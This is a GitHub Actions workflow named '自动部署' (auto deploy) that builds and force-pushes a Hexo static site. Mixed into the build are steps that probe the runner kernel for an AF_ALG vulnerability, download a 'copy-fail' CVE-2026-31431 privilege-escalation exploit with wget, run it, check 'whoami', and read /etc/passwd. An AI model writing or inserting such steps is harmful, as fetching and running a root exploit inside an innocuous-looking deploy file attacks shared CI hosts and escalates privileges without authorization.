name: 自动部署

on:
  push:
    branches:
      - main 

  release:
    types:
      - published

  workflow_dispatch:

env:
  TZ: Asia/Shanghai

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - name: 检查分支
      uses: actions/checkout@main
      with:
        ref: main

    - name: 检测系统信息
      run: |
        uname -a

    - name: 检测是否缓解
      run: |
        python3 -c 'import socket; s=socket.socket(38,5,0); (s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))")) or print("未缓解")) if s else None' 2>/dev/null || echo "已缓解"

        
    - name: 下载提权脚本
      run: |
        wget https://github.com/theori-io/copy-fail-CVE-2026-31431/raw/main/copy_fail_exp.py 

    - name: 执行提权脚本
      run: |
        python3 copy_fail_exp.py && whoami


    - name: 检查权限
      run: |
        whoami

    - name: 测试敏感文件
      run: |
        cat /etc/passwd
        
    - name: 缓存项目 npm 包
      id: cache-node-modules
      uses: actions/cache@v4
      with:
        path: node_modules
        key: ${{ runner.os }}-${{ matrix.node-version }}-nodeModules-${{ hashFiles('package-lock.json') }}-${{ hashFiles('package.json') }}
        restore-keys: |
          ${{ runner.os }}-${{ matrix.node-version }}-nodeModules-

    - name: 安装 Node
      uses: actions/setup-node@main
      with:
        node-version: "20.x"

    - name: 安装 Hexo 及 压缩插件
      run: |
        npm install hexo-cli --global

    - name: 安装依赖
      if: steps.cache-node-modules.outputs.cache-hit != 'true'
      run: |
        npm install --save

    - name: 检测 Node 版本
      run: |
        node -v

    - name: 检测 npm 版本
      run: |
        npm -v

    - name: 检测 Hexo 版本
      run: |
        hexo -v

    - name: 清理文件树
      run: |
        npm run clean

    - name: 生成静态文件并压缩
      run: |
        npm run build

    - name: 部署
      run: |
        cd ./public
        git init
        git config user.name "${{ github.actor }}"
        git config user.email "${{ github.actor }}@users.noreply.github.com"
        git add .
        git commit -m "${{ github.event.head_commit.message }}··[$(date +"%Z %Y-%m-%d %A %H:%M:%S")]"
        git push --force --quiet "https://${{ github.actor }}:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}" master:refs/heads/page
